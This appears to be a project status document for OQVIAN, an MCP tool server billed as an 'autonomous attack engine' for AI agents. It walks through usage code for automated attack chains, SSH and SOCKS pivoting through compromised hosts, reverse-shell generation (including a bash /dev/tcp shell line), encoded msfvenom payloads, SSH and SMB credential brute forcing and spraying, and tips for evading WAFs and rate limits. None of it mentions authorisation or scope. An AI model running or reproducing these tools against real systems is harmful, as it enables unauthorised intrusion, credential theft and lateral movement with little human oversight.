# OQVIAN Phase 2 COMPLETE ✅

**Date**: 2026-11-06  
**Final Commit**: `0f893de`  
**Repo**: https://github.com/Ahnaf-Code55/oqvian-cyber

---

## Summary

Phase 2 transforms OQVIAN from a "tool executor" to an **autonomous attack engine** with 6 new MCP tools that enable:

- **Auto-chaining**: Recon → Scan → Enumerate → Exploit
- **Lateral movement**: SSH tunnels and SOCKS pivoting
- **Adaptive learning**: "What worked/failed and why"
- **Payload generation**: Reverse shells and encoded payloads
- **Credential testing**: Auto-brute with discovered creds
- **Backtracking**: Smart fallback when techniques fail

---

## The 6 Phase 2 Tools

### 1. `chain` — Pre-defined Attack Chains

Run automated attack sequences with backtracking.

**Available Chains:**
```
web-app    → full web app assessment (recon → scan → enumerate → exploit)
network    → network recon and service exploitation
ad-attack  → Active Directory enumeration and exploitation
box-take   → full box takeover (initial access → privesc → root)
```

**Usage:**
```python
# Web app attack chain
chain(
    name="web-app",
    target="http://www.example.com",
    verbose=True,
    max_failures=3  # Stop after 3 consecutive failures
)

# AD attack chain
chain(
    name="ad-attack",
    target="192.168.1.100",
    user="admin",
    pass_="password123",
    domain="CORP.LOCAL"
)
```

**Features:**
- Auto-updates `state` as each step completes
- Stops after N consecutive failures (backtracking)
- Saves chain execution history to `~/.local/share/oqvian/state/chains/`
- Verbose output shows progress

---

### 2. `pivot` — Tunnel Through Compromised Hosts

Enable lateral movement through SSH tunnels and SOCKS proxies.

**Actions:**
```
list        → show all active pivots
ssh_tunnel  → create SSH tunnel through pivot host
socks       → create SOCKS proxy for proxychains
scan        → scan remote network through pivot
close       → close a pivot tunnel
```

**Usage:**
```python
# Create SSH tunnel through compromised host
pivot(
    action="ssh_tunnel",
    pivot_host="10.0.0.5",
    pivot_user="www-data",
    pivot_port=22,
    tunnel_port=8080
)

# Create SOCKS proxy
pivot(
    action="socks",
    pivot_host="10.0.0.5",
    pivot_user="admin",
    pivot_key="/root/.ssh/id_rsa",
    tunnel_port=1080
)

# Scan internal network through pivot
pivot(action="scan", remote_target="192.168.1.0/24")

# List all pivots
pivot(action="list")
```

**Use Case:**
```
1. Compromise web server at 10.0.0.5
2. Create SSH tunnel: pivot(action="ssh_tunnel", ...)
3. Scan internal network: pivot(action="scan", remote_target="192.168.1.0/24")
4. Discover new targets behind the pivot
```

---

### 3. `adapt` — Adaptive Learning from Results

Record what worked/failed and get auto-generated recommendations.

**Usage:**
```python
# Record a failed exploit
adapt(
    technique="CVE-2021-41773",
    result="failed",
    reason="WAF blocked",
    target="www.example.com"
)
# Output: "Try encoded payloads (base64, hex, URL encoding)"

# Record rate limiting
adapt(
    technique="brute_force_ssh",
    result="failed",
    reason="rate_limit",
    target="10.0.0.5"
)
# Output: "Slow down requests or use different source IP"
```

**Auto-generated Recommendations:**

| Failure Reason | Recommendation |
|----------------|----------------|
| WAF blocked | Try encoded payloads (base64, hex, URL encoding) |
| rate_limit | Slow down requests or use different source IP |
| version_mismatch | Search for alternative exploits for same CVE |
| auth_required | Try credential brute force or find auth bypass |
| timeout | Try simpler/smaller payload or increase timeout |

**Storage**: `~/.local/share/oqvian/state/learning.json`

---

### 4. `payload` — Reverse Shell and Payload Generator

Generate reverse shells or encode payloads with msfvenom.

**Actions:**
```
generate  → create reverse shell (bash, python, php, powershell, java, etc.)
msfvenom  → use msfvenom to generate encoded payload
encode    → encode payload (base64, hex, URL encoding)
```

**Usage:**
```python
# Generate bash reverse shell
payload(
    action="generate",
    language="bash",
    lhost="10.0.0.1",
    lport=4444
)
# Output: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Generate Python reverse shell
payload(
    action="generate",
    language="python",
    lhost="10.0.0.1",
    lport=4444
)

# Generate with msfvenom
payload(
    action="msfvenom",
    lhost="10.0.0.1",
    lport=4444,
    format_="elf",
    encoder="x86/shikata_ga_nai",
    output="/tmp/shell.elf"
)

# Encode payload
payload(
    action="encode",
    language="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    encoder="base64"
)
```

**Available Shell Languages:**
- bash, python, php, powershell, java, perl, ruby, netcat, C

---

### 5. `creds` — Auto-Credential Tester

Test credentials against services automatically.

**Actions:**
```
test        → test single credential pair
brute       → brute force with wordlist
spray       → password spray (one password, multiple users)
discovered  → test all discovered creds against all services
```

**Supported Services:**
SSH, SMB, FTP, MySQL, PostgreSQL, Redis, RDP, Telnet

**Usage:**
```python
# Test single credential
creds(
    action="test",
    target="10.0.0.5",
    service="ssh",
    username="admin",
    password="test123"
)

# Brute force with wordlist
creds(
    action="brute",
    target="10.0.0.5",
    service="ssh",
    username="admin",
    wordlist="/usr/share/wordlists/rockyou.txt"
)

# Password spray
creds(
    action="spray",
    target="10.0.0.5",
    service="smb",
    password="Password123!",
    wordlist="/usr/share/wordlists/users.txt"
)

# Test all discovered creds
creds(action="discovered", target="10.0.0.5", batch_size=10)
```

---

### 6. `backtrack` — Alternative Technique Recommender

Try alternative techniques when current approach fails.

**Usage:**
```python
# CVE-specific alternatives
backtrack(
    target="www.example.com",
    technique="CVE-2021-41773",
    reason="WAF blocked"
)
# Output: Try CVE-2021-42013, encoded payload, dir brute

# Service-specific fallbacks
backtrack(
    target="10.0.0.5",
    technique="ssh_brute",
    reason="timeout"
)
# Output: Try SSH enum, weak key check, credential spray
```

**Alternative Mappings:**
- `CVE-2021-41773` → CVE-2021-42013, encoded payload, dir brute
- `ssh_brute` → SSH enum, weak key check, credential spray
- `smb_brute` → null session, SMB enum, MS17-010
- `web_vuln` → SQLi, XSS, command injection, SSRF

**Auto-records** failure in `adapt` learning.

---

## Full Autonomous Attack Flow

```python
# 1. Run web app attack chain
chain(name="web-app", target="http://www.example.com", verbose=True)

# Output:
# 🔗 Starting chain: Web Application Attack Chain
# 🎯 Target: http://www.example.com
# 
# ▶️  [recon] recon...
#    ✅ Success (2456 bytes)
# 
# ▶️  [tech_detect] execute...
#    ✅ Success (1234 bytes)
#    Output preview: Apache/2.4.49 (Ubuntu)
#
# ▶️  [vuln_scan] execute...
#    ✅ Success (890 bytes)
#    Output preview: CVE-2021-41773: Apache Path Traversal
#
# 📊 Chain Summary:
#    Total steps: 6
#    Success: 5
#    Failures: 1
#    Duration: 45.2s

# 2. Record adaptive learning
adapt(technique="CVE-2021-41773", result="failed", reason="WAF blocked")
# → "Try encoded payloads"

# 3. Generate exploit payload
payload(action="generate", language="python", lhost="10.0.0.1", lport=4444)

# 4. Test discovered credentials
creds(action="discovered", target="www.example.com")

# 5. If technique fails, get alternatives
backtrack(target="www.example.com", technique="CVE-2021-41773", reason="WAF")

# 6. If shell obtained, create pivot
pivot(action="ssh_tunnel", pivot_host="www.example.com", 
      pivot_user="www-data", tunnel_port=8080)

# 7. Scan internal network through pivot
pivot(action="scan", remote_target="192.168.1.0/24")

# 8. Collect loot
loot(action="add", target="www.example.com", loot_type="vuln", 
      name="CVE-2021-41773", content="Apache Path Traversal confirmed")
```

---

## Attack Chain Definitions

### web-app Chain
```
recon (HTTP probe) 
→ tech_detect (httpx) 
→ port_scan (1-1024) 
→ vuln_scan (nuclei critical/high) 
→ dir_enum (ffuf) 
→ js_crawl (katana)
```

### network Chain
```
dns_enum 
→ subdomain_enum 
→ port_scan (1-65535) 
→ service_enum (nmap -sV) 
→ vuln_scan (nuclei)
```

### ad-attack Chain
```
smb_enum (netexec) 
→ user_enum 
→ pass_policy 
→ kerberos_enum (certipy) 
→ as_replay (GetUserSPNs)
```

### box-take Chain
```
recon 
→ scan (nmap -p-) 
→ vuln_scan (nuclei) 
→ dir_brute (gobuster) 
→ sql_test (sqlmap)
```

---

## Files Changed

| File | Lines Added | Description |
|------|-------------|-------------|
| `mcp/server.py` | +928 | 6 new tools + attack chain engine |
| `docs/PHASE-2-SUMMARY.md` | +286 | Initial Phase 2 guide |
| `docs/PHASE-2-COMPLETE.md` | +this | Final Phase 2 documentation |

**Commits:**
- `42f34cc` — feat: Phase 2 - attack chains, pivot, and adaptive reasoning
- `b644b77` — docs: Phase 2 summary with usage examples
- `0f893de` — feat: Phase 2 complete - payload, creds, and backtrack tools

---

## Testing

```bash
cd ~/oqvian-cyber

# Test chain tool (dry run)
.venv/bin/python -c "
from mcp import server
print(server.chain(name='web-app', target='http://localhost', verbose=False))
"

# Test pivot tool
.venv/bin/python -c "
from mcp import server
print(server.pivot(action='list'))
"

# Test adapt tool
.venv/bin/python -c "
from mcp import server
print(server.adapt(technique='test', result='failed', reason='WAF'))
"

# Test payload tool
.venv/bin/python -c "
from mcp import server
print(server.payload(action='generate', language='bash', lhost='10.0.0.1', lport=4444))
"

# Test creds tool
.venv/bin/python -c "
from mcp import server
print(server.creds(action='test', target='10.0.0.5', service='ssh', username='admin', password='test'))
"

# Test backtrack tool
.venv/bin/python -c "
from mcp import server
print(server.backtrack(target='www.example.com', technique='CVE-2021-41773', reason='WAF'))
"
```

---

## Phase 2 vs Phase 1 Comparison

| Capability | Phase 1 | Phase 2 |
|------------|---------|---------|
| **State tracking** | ✅ Manual | ✅ Auto-updated during chains |
| **Loot collection** | ✅ Manual | ✅ Auto-save successful creds |
| **Exploit search** | ✅ searchsploit | ✅ + backtrack alternatives |
| **Attack chaining** | ❌ | ✅ Pre-defined chains |
| **Lateral movement** | ❌ | ✅ SSH tunnels, SOCKS |
| **Adaptive learning** | ❌ | ✅ Auto-recommendations |
| **Payload generation** | ❌ | ✅ Reverse shells, msfvenom |
| **Credential testing** | ❌ | ✅ Auto-brute, spray |
| **Backtracking** | ❌ | ✅ Smart fallback |

---

## Status

✅ **Phase 2 COMPLETE**

- [x] `chain` tool (pre-defined attack chains)
- [x] `pivot` tool (SSH tunnels, SOCKS proxies)
- [x] `adapt` tool (adaptive learning)
- [x] `payload` tool (reverse shells, msfvenom)
- [x] `creds` tool (auto-credential tester)
- [x] `backtrack` tool (alternative recommender)
- [x] Attack chain engine with backtracking
- [x] Auto-state updates during chains
- [x] All changes committed and pushed

**Total: 9 new MCP tools added in Phase 2** (6 in Phase 2 + 3 from Phase 1)

---

## Next Steps (Phase 3)

Ready to build:
1. **Learning system** — track success rates across sessions
2. **Hacker intuition DB** — "Apache 2.4.49 → CVE-2021-41773 works 80%"
3. **Auto-update corpus** — pull new CVEs/exploits automatically
4. **Cross-session learning** — what worked on target A helps with target B

---

## Cost

💰 **$0** — All tools run locally, no API calls required.
